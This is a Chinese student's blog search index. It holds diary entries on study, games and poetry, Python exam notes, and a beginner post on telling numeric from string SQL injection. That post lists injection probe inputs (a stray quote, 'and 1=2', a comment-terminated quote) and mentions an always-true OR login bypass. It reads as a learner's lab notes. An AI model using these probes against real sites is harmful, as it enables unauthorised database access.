<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>锦瑟</title>
    <url>/2022/11/05/Diary_1105/</url>
    <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
<span id="more"></span>

<h1 id="随便说点"><a href="#随便说点" class="headerlink" title="随便说点"></a>随便说点</h1><p>啊，今天是我第一天写日志。摸索中…</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>今天突然回想起一首诗，是李商隐的《锦瑟》。我还蛮喜欢的。<br>      <strong>锦瑟</strong>  李商隐<br>锦瑟无端五十弦，一弦一柱思华年。<br>庄生晓梦迷蝴蝶，望帝春心托杜鹃。<br>沧海月明珠有泪，蓝田日暖玉生烟。<br>此情可待成追忆，只是当时已惘然。</p>
<p>一开始没想起来诗句，后面一想起来全托出来了。<br>上网搜的时候，看到了一个人评价这首诗–<strong>美在解与不解之中</strong><br>说得挺好的，换个词即为<strong>朦胧感</strong>。</p>
<h1 id="来说说今天做了什么吧。"><a href="#来说说今天做了什么吧。" class="headerlink" title="来说说今天做了什么吧。"></a>来说说今天做了什么吧。</h1><ol>
<li><p>上午python爬虫的网课，但课程是两年前的。因此导致很多地方对不上，即便照着参考代码写也会报错…虽然是因为我买了课没有及时学，但问群里的主讲老师也不会，这样的服务态度着实让我不适。网易云课堂上的大熊课堂python，讲得还是挺清晰，但布置的作业和视频上的代码都无法正常运行那也很糟糕。<br>给我的教训是：<em>买了有时效性的网课要及时学</em></p>
</li>
<li><p>下午睡了俩小时，午睡时间太长了。但半小时又会很快感觉困，高中的时候也没这样啊。看来还是压力不够，决定明天睡眠时间缩短到1h以内，如果感觉困，就用冷水浇醒自己。<br>先看看这样是否行得通吧。</p>
</li>
<li><p>之后看了Web安全的基础–SQL注入漏洞。今天主要是看书《Web安全深度剖析》，SQL注入这一章是看完了，看得比较快，倒懂不懂的感觉吧。主要是过一遍，明天看视频。</p>
</li>
<li><p>最后学了半小时JS。还是在网易云课堂上学的，看的leo老师的网课。讲得蛮清晰，目前感觉良好。</p>
</li>
<li><p>24:30的《孤独摇滚》动画更新了，看动画去了。</p>
</li>
</ol>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>惜</title>
    <url>/2022/11/06/Diary_1106/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
<li>上午9点体测，跳远和引体向上。排队等了一个小时。</li>
<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>也无风雨也无晴</title>
    <url>/2022/11/07/Diary_1107/</url>
    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
<span id="more"></span>

<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
<p>上午早上八点的课，让人十分难以起床，毕竟晚上只睡了6h不到，起来后又不想用冷水洗脸，因为感冒。起得晚果不其然上课迟到了，虽然我不在意。</p>
<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
<p>下午一直在上课，午觉也只睡了半小时。第一节是《网络安全服务与管理》，去了之后发现这门课都没什么用。干脆下次不去了吧。</p>
<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>夫天地者，万物之逆旅也</title>
    <url>/2022/11/08/Diary_1108/</url>
    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
<span id="more"></span>

<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>欲望占据的一周</title>
    <url>/2022/11/13/Diary_1113/</url>
    <content><![CDATA[<p><img src="/images/%E6%89%98%E5%B0%948.gif" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好几天没写日记了，这一周实在是非常懈怠，虽然写这篇的时候已经很迟了，明早8点还得起床，但我还是要写，记录一下我的罪行！</p>
<h1 id="对自己感到愤怒"><a href="#对自己感到愤怒" class="headerlink" title="对自己感到愤怒"></a>对自己感到愤怒</h1><p>从周四开始，被周围某人诱惑买了文明6，于是开始玩，这一下子变得无法收拾，当天玩到4点过。随后的几天也是花费大量时间在上面。导致学习进度几乎停滞。<br>但这并不是责怪诱惑我的玩游戏的人，只不过是我自己要靠近诱惑，最终被诱惑罢了。<br>绝大多数人的意志力其实并不强，在知道王阳明不被欲望打动的方法就是远离欲望后，我也顿悟了。但这周还是破功了，真是功亏一篑啊。</p>
<p>话虽如此，其实文明6还是挺好玩的，虽然steam好评不到90%，但我蛮喜欢的。<br>周围有4人都买了这款游戏，但还是只有和专注玩游戏的人一起玩才好玩。有的人玩着玩着退了，有的人刚买就玩别的游戏，有的人忙着打电话。我和这些人玩得不到好的游戏体验，也让我挺不满的。不曾想，怂恿我买游戏的人，却没给我好的游戏体验。所以说，这样子真不可靠。不要在同一个地方跌倒两次，不要轻易被怂恿！<br>幸好周围有个人是专注玩游戏的，今天玩得很开心。倒也算是一桩幸事了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>要专注学习了！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>多情应笑我</title>
    <url>/2022/11/14/Diary_1114/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%9B&%E6%8A%9A%E5%AD%905.png" alt="凛和抚子"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>满足？懈怠？享受？堕落？</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>故国神游，多情应笑我，早生华发。</p>
<h1 id="完整而有力"><a href="#完整而有力" class="headerlink" title="完整而有力"></a>完整而有力</h1><p>今日的生活勉强算是充实，不过还没从上周的状态中恢复过来。也许正因如此，我才能如此果断地选择花费2小时看搖曳露营的电影。所谓塞翁失马焉知非福吧。<br>python的复习又给了我一种好像什么都复习完了，不需要再看了的感觉，但我知道这是不行的，病毒和计算机网络的教训历历在目，我一定要克服这种半壶水响叮当的傲慢。<br>虽然我并不反感傲慢，但我认为真正的傲慢，是凌驾于一切之上，睥睨众生的狂气。而不是自大自以为足够了的浮躁情绪。<br>摇曳露营电影看完了，虽然一路上带着小心翼翼的感觉，什么有什么波动大的情节，但幸好，没有网友说的那样糟糕。<br>我的文笔水平十分落后啊，本想写些什么，却发现只得冒出点浑浊的自来水，完全没有让人想喝下去的动力嘛。还是参考一下信评动画吧。酝酿一下，想的和写的是两回事啊！<br>正如标题所写，我想过一种完整而有力的人生。所谓完整，即不要被碎片化的事物分散精力与时间，比如看一些无关紧要的视频，或是做一些毫无意义的事情，又或是毫无理由的拖延等等。所谓有力，如尼采的一句话所说：每一个不曾起舞的日子，都是对生命的辜负。每一天都要竭尽全力去度过，去参与，去燃烧自己的热情。不要害怕过度，即便过度了，这样的日子也是一天天在减少，珍惜吧！</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>尽快恢复学习的状态，不要一蹶不振，不要持续受到诱惑，还有很多事需要完成啊！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>花落知多少</title>
    <url>/2022/11/17/Diary_1117/</url>
    <content><![CDATA[<p><img src="/images/8.jpg" alt=" "></p>
<span id="more"></span>

<h1 id="一句诗"><a href="#一句诗" class="headerlink" title="一句诗"></a>一句诗</h1><p>The world has kissed my soul with its pain, asking for its return in songs.<br>世界以痛吻我，要我报之以歌。</p>
<h1 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h1><p>交易要以最少的信息，达成最大的目的。<br>不要觉得自己宽容大度，多出让一些没关系，好心有时会办坏事。<br>今日与人交易得到的教训。虽然没赚到钱，但让我学到了比钱更重要的东西。</p>
<h1 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h1><p>今天晚上看的动画《赛博朋克 边缘行者》，里面出现了黑客。<br>让我自己想成为黑客的心又微微颤动了，差点想大半夜的再学一会儿哈哈<br>回想起第一部看的动画里，出现黑客的，那还非《命运石之门》莫属。</p>
<h1 id="效率"><a href="#效率" class="headerlink" title="效率"></a>效率</h1><p>学到22点的时候感觉蛮疲惫了，洗冷水脸也没什么效果，导致本来一小时内能完成的，花了两小时。<br>是不是运动一下比较好呢，下次试试吧。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>聪明与智慧</title>
    <url>/2022/11/16/Diary_1116/</url>
    <content><![CDATA[<p><img src="/images/%E6%89%98%E5%B0%9416.png" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>12332112333321</p>
<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>大知闲闲，小知间间；大言炎炎，小言詹詹</p>
<h1 id="指尖须臾"><a href="#指尖须臾" class="headerlink" title="指尖须臾"></a>指尖须臾</h1><p>python期末考试结束了，很简单。不仅是我这么觉得，考室里一半以上的人都30分钟交卷了，或许这是今年最简单的一次考试？</p>
<p>之前本想说点什么，到临睡前却不知说什么了。可如果当时有想法的时候就写，又会打断正在做的事。两难选择，一直如此。</p>
<p>聪明是先天的，智慧是后天的。聪明通常是运用于某些专门知识上的，智慧通常更加广泛，因而并不一定能给学习运用专门知识带来较大帮助。聪明与智慧并不是一个同义词，至少我这么想。有其中一种，并不代表能拥有另一种。<br>有趣的是，如果只能拥有其中一种，那么人会更倾向于哪一种呢？<br>就思考到这里吧，夜已弥漫。</p>
<p>今天帮朋友弄“今日校园”app的定位签到，花了我大半时间，也没弄出来。这玩意儿太难搞了。得亏我这边没弄呢。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>别忘了CET6的复习！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>普通且自信</title>
    <url>/2022/11/18/Diary_1118/</url>
    <content><![CDATA[<p><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B51.png" alt="犬山葵"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一天的学习还是挺充实的，平静的生活。</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>长风破浪会有时，直挂云帆济沧海。</p>
<h1 id="行路难"><a href="#行路难" class="headerlink" title="行路难"></a>行路难</h1><p>这样的日子，独自的世界。<br>是枯燥的吗？是斑斓的吗？让人多想的时候，就不禁觉得，热情会被拉扯而消散。<br>还是少想一些吧，多做事。<br>今天突然想到了一个短语，大概是最近几年流行的？ 普通且自信<br>其实原本都没怎么在意过这个词，是被某人用在我身上贬我的时候，才注意到的。<br>似乎在网络上被人作为贬义而广泛使用。但其实，我个人而言，还蛮喜欢这个短语的。<br>说起来，什么是普通呢？<br>我想，当某人拥有某一方面的长处时，或许有人会认为他不普通。但这其实只是就这方面而言，其他不是长处的方面，不也很普通吗？<br>如果说，崭露头角的人是不普通的，那么衡量标准就成为了一个人在这世界上的名气，那岂不是“不普通”&#x3D;“名气大”吗？我也并不这么认为。<br>浅浅的思考了之后，给出一个暂时的答案吧。<br>我心中的不普通的人，一种是有智慧wisdom的人，另一种是在某一方面处于超脱常人（在整个世界上来衡量）的人。这后一种的不普通，就不一定是好的形容了。<br>自信，我认为在认为时候都不应当是贬义词，与自信相对的贬义词并不是没有：过度自信是自负，没有自信是自卑。</p>
<p>普通且自信，这个标签，也许还不错？<br>即便有人用这个词来贬我，我恐怕也只会报之一笑吧。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>每次碍于时间，想写什么，都不敢写深入，抽个时间，写点深刻的文字吧。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>我对普通人类没有兴趣</title>
    <url>/2022/11/21/Diary_1121/</url>
    <content><![CDATA[<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png" alt="志摩凛"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>晚上学习的时候一个东西始终搞不通，烦死人了。</p>
<h1 id="一段文言文"><a href="#一段文言文" class="headerlink" title="一段文言文"></a>一段文言文</h1><p>夫子之道至大，故天下莫能容。虽然，夫子推而行之，不容何病，不容然后见君子！夫道之不修也，是吾丑也。夫道既已大修而不用，是有国者之丑也。不容何病，不容然后见君子！<br>--节选自《史记 孔子世家》</p>
<h1 id="不容然后见君子"><a href="#不容然后见君子" class="headerlink" title="不容然后见君子"></a>不容然后见君子</h1><p>上面那段文言文，最喜欢的就是我写在标题上这句话。有一种豪气或是傲慢在里面：你天下容不下我的理念，这是你天下的度量不够大，这不是我的过错。容不下又如何呢？就是因为容不下，才显得我是君子！<br>这是孔子提问时，颜回对孔子的回答。不愧是孔子最得意的门生呀。我想，做人能做到这种程度，就已然足够了。</p>
<h1 id="永恒"><a href="#永恒" class="headerlink" title="永恒"></a>永恒</h1><p>在最光辉灿烂的时候把生命一下子玩到尽头，就是永恒！  --黄家驹<br>来吧，用尽力气，去燃烧生命吧！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>平水远矣</title>
    <url>/2022/11/19/Diary_1119/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_4.png" alt="凉宫春日&amp;长门有希"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>糟糕的一天</p>
<h1 id="兜兜转转"><a href="#兜兜转转" class="headerlink" title="兜兜转转"></a>兜兜转转</h1><p>今天一天什么都没玩，但我感觉非常地不好，没学到多少东西。就像绕着一个圈子一直在兜兜转转，没啥好说的，明早早起。<br>今天是World Cup(世界杯)开幕式来着，我倒是没什么兴趣，就这样吧。</p>
<h1 id="平水远矣"><a href="#平水远矣" class="headerlink" title="平水远矣"></a>平水远矣</h1><p>人生就像一碗盛满的水，唯有把水端平，才走得远。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>赶紧早点睡咯</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>出淤泥</title>
    <url>/2022/11/23/Diary_1123/</url>
    <content><![CDATA[<p><img src="/images/kaneki_3.png" alt="金木研"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>World Cup(世界杯)很火，以前都没怎么关注，但是在大学因为各方面因素吧，让我这种从不关注世界杯的人都开始了。当然是被迫的，实在太吵了周围人，让我不得不。<br>然而，虽然很火，其实重头还是在赌球上，并不在足球本身，想想也挺无聊。</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>既见君子，云胡不喜</p>
<h1 id="欲望的故事"><a href="#欲望的故事" class="headerlink" title="欲望的故事"></a>欲望的故事</h1><p>王阳明上学的路上要经过一条街，一天，街上忽然多了一家赌博的小馆子，里面每天都挤满了人。跟王阳明一起上学的同伴们有时也会好奇地站在门口往里面看。王守仁提醒大家离赌场远点，大家都不当回事：就看看，不进去，有啥？<br>看看劝阻无效，王阳明就跟小伙伴儿建议：咱们换条路走吧。小伙伴儿很不解：“他赌他的，咱走咱的，互不相干，有啥关系？你这胆子也太小了。”<br>王阳明答：“我怕看多了，也会产生欲望，挡不住诱惑。”<br>小伙伴们哈哈大笑：“看几眼就受不了，那意志也太不坚定了。咱们这么志怀高远的不会的，放心好了。”<br>小伙伴们坚持走原路，只有王阳明一个人每天绕道去私塾，不再从那条街过。<br>一个多月后，有位同学接连几天都没来上课。原来他前段时间迷上了赌博，开始只是拿一点小钱来玩，后来越玩越大，偷了家里的玉器，父母得知后非常生气，把他关在家中反省。<br>王守仁后来讲这个故事给人听，并总结说：“想要避免欲望，最好的办法就是远离，甚至不要多看一眼。这不是胆子小，而是从根源上隔绝欲望。”</p>
<h1 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h1><p>很多年前看到这个故事，是在一本杂志的卷首。说实话，这给了我非常大的触动。在这之前，我一直认为，抵挡不住诱惑是因为自身的意志力不够，所以才会被欲望牵着鼻子走。可看了这样一个如此优秀的人都没有对自己自制力感到自信，我也释然了。<br>像这样有智慧的人，即便是在他小时候，已经能明悟这种很多人不明白的道理，也远超大多成年人了。</p>
<h1 id="世界杯"><a href="#世界杯" class="headerlink" title="世界杯"></a>世界杯</h1><p>如果世界杯的火爆只是因为赌球，那只能是一种悲哀。因为赌球无非是贪欲和浮躁的混杂，既无技术又无规律，毫无看点可言。<br>虽然我对世界杯没有兴趣，却也不愿看到这种光景。<br>然而，其实我们也可以反思当下环境中赌球之心如此热烈的原因。主要原因就是经济衰退，赚钱困难。也可谓人之常情吧。<br>最近周围很多人都在谈论赌球，甚至参与赌球。但我绝不参与，无论周围人之后翻了多少倍我也不会眼红。原因，已经在上面故事里讲得很清楚了。只是即便如此也会被影响，还是略有不适吧。<br>好笑的是，原本周围两个冷战关系不好的人，却因为世界杯赌球聊起来了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我现在就像是在淤泥中，愿我能不染。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>是非成败转头空</title>
    <url>/2022/11/24/Diary_1124/</url>
    <content><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.png" alt="本间芽衣子"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知不觉过去了一天…</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>You smiled and talked to me of nothing and I felt that for this I had been waiting long.<br>你微笑地看着我，不说一句话。而我知道，为了这个，我已经等待很久了。</p>
<h1 id="时间的认知"><a href="#时间的认知" class="headerlink" title="时间的认知"></a>时间的认知</h1><p>零点过的时候，骤然看了下日期，发现周五，以为明日是周末了。一种快乐从我心底迸发，是惊讶的喜悦。可我过了会儿发现，日期是零点过后看的，周五才刚刚开始。我就像走入了周五的循环，第一次认识的时候，它是<strong>末尾</strong>。第二次认识的时候，它是<strong>开始</strong>。下一次认识，恐怕又是<strong>末尾</strong>了吧。<br>好像有什么变了，好像什么都没变。变的是我的认知，不变的是世界的规律。</p>
<h1 id="一天"><a href="#一天" class="headerlink" title="一天"></a>一天</h1><p>突然想到了穆勒的《功利主义》，好久没读了。这里提醒自己一下，有时间去读。这本书的一些重要思想：</p>
<ul>
<li>高级快乐和低级快乐，快乐有质的不同</li>
<li>调和美德与幸福的冲突，美德也是一种幸福</li>
<li>正义是需要感性的力量，有别于利益</li>
</ul>
<p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之字符型和数字型判断</title>
    <url>/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习SQL注入，应当对SQL语句较为熟悉，否则会比较懵。</p>
<span id="more"></span>

<h1 id="数字型判断"><a href="#数字型判断" class="headerlink" title="数字型判断"></a>数字型判断</h1><p>假如数据库中的SQL语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>and</strong><br>当$id &#x3D; 1 and 1&#x3D;1 时，两者为true即返回正常<br>当$id &#x3D; 1 and 1&#x3D;2 时，后者为false即返回错误</p>
</li>
<li><p><strong>加单引号</strong><br>假如$id &#x3D; 1’  在数据库中为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>单引号不匹配，因此返回错误<br>（说明：其它形式的符号也是类似情况）</p>
</li>
</ol>
<h1 id="字符型判断"><a href="#字符型判断" class="headerlink" title="字符型判断"></a>字符型判断</h1><p>假如数据库中的SQL语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>and</strong><br>当$id &#x3D; 1 and 1&#x3D;1  或 $id &#x3D; 1 and 1&#x3D;2 时，<br>因为有引号包裹，因此均返回正常</p>
</li>
<li><p><strong>加单引号</strong><br>假如$id &#x3D; 1’  在数据库中为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>多余的单引号不匹配，因此返回错误</p>
</li>
</ol>
<p>字符型可以通过闭合多余的单引号，使用注释符#或--+或%23</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="comment">--+&#x27;</span></span><br></pre></td></tr></table></figure>
<p>最后的引号被注释掉，实际运行效果是id&#x3D;’1’<br>因此返回正常</p>
<h1 id="字符型和数字型"><a href="#字符型和数字型" class="headerlink" title="字符型和数字型"></a>字符型和数字型</h1><p>通过以上分析，我们可以得出结论：</p>
<ul>
<li>当$id&#x3D;1 and 1&#x3D;2 时，<br>数字型返回错误，而字符型返回正常</li>
<li>当$id&#x3D;1’ 时，<br>二者均返回错误</li>
<li>当$id&#x3D;1’--+ 时，<br>数字型返回错误，而字符型返回正常</li>
</ul>
<p>注：or可以构造一个一直为true的语句，能返回正常。常用于万能密码</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_44798520/article/details/122453649">sql注入_字符型、数字型判断</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>字符型</tag>
        <tag>数字型</tag>
      </tags>
  </entry>
  <entry>
    <title>Python期末专题</title>
    <url>/2022/11/13/Python%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当撰写这篇Python复习专题的时候，距离期末考试仅剩3天。<br>我啊，真是堕落。&#x2F;(ㄒoㄒ)&#x2F;~~<br>本篇复习主要以两次测试以及题库为主，其它作为补充。</p>
<span id="more"></span>

<h1 id="概念题"><a href="#概念题" class="headerlink" title="概念题"></a>概念题</h1><ol>
<li>id()函数</li>
</ol>
<ul>
<li>定义和用法<br>id() 函数返回指定对象的唯一 id。<br>Python 中的所有对象都有其自己的唯一 id。<br>id 在创建时已分配给对象。<br>id 是对象的内存地址，并且在每次运行程序时都不同。（除了某些具有恒定唯一 id 的对象，比如 -5 到 256 之间的整数</li>
<li>语法<br>id(object)</li>
</ul>
<ol start="2">
<li><p>Python是一种<strong>跨平台</strong>的，是一个高层次的结合了<strong>解释性</strong>、<strong>编译性</strong>、<strong>互动性</strong>和<strong>面向对象</strong>的<strong>脚本</strong>语言</p>
</li>
<li><p>python序列</p>
</li>
</ol>
<ul>
<li>有序序列包括： <strong>列表 元组 字符串</strong></li>
<li>无序序列包括： <strong>字典 集合 控制集合数据的对象</strong></li>
</ul>
<ol start="4">
<li><p>python程序的扩展名<br>.py是<strong>源文件扩展名</strong><br>.pyw是另一种<strong>源文件扩展名</strong>  主要用于GUI程序发布时不需要看到控制台信息的情况<br>.pyc是<strong>源文件编译后的文件</strong><br>.pyo是<strong>源文件优化编译后的文件</strong><br>.pyd是<strong>其他语言写的python库</strong></p>
</li>
<li><p>Python注释</p>
</li>
</ol>
<ul>
<li>单行注释 #</li>
<li>多行注释(不一定是注释，有时可作为字符串存在)<br>单引号 <code>&#39;&#39;&#39;</code><br>双引号 <code>&quot;&quot;&quot;</code></li>
</ul>
<ol start="6">
<li><p>Python 变量名区分大小写<br>例如：Cuit和cuit是两个变量名</p>
</li>
<li><p>非面向对象的程序设计语言是<br>C语言  汇编语言</p>
</li>
<li><p>使用上下文管理关键字<strong>with</strong>可以自动管理文件对象，不论何种原因结束该关键字中的语句块，都能保证文件被正确关闭</p>
</li>
<li><p>Python3 中有六个标准的数据类型：</p>
</li>
</ol>
<ul>
<li>Number（数字）  支持 int、float、bool、complex（复数）</li>
<li>String（字符串）</li>
<li>List（列表）</li>
<li>Tuple（元组）</li>
<li>Set（集合）</li>
<li>Dictionary（字典）</li>
</ul>
<ol start="10">
<li><p>Python中的关系运算符可以连续使用<br>如：6&lt; a &lt;10</p>
</li>
<li><p>Python 3.x 中可以使用中文作为变量名</p>
</li>
<li><p>生成器推导式比列表推导式具有更高的效率，推荐使用</p>
</li>
<li><p>Python编程中，提示符“&gt;&gt;&gt;”表示 交互式编程模式</p>
</li>
<li><p>Python不允许使用<strong>关键字</strong>作为变量名，允许使用<strong>内置函数名</strong>作为变量名，但这会改变函数名的定义</p>
</li>
<li><p>Python中相同的值在内存中的保存</p>
</li>
</ol>
<ul>
<li>对于[-5, 256]之间的整数，会在内存中进行缓存，任何时刻在内存中只有一份</li>
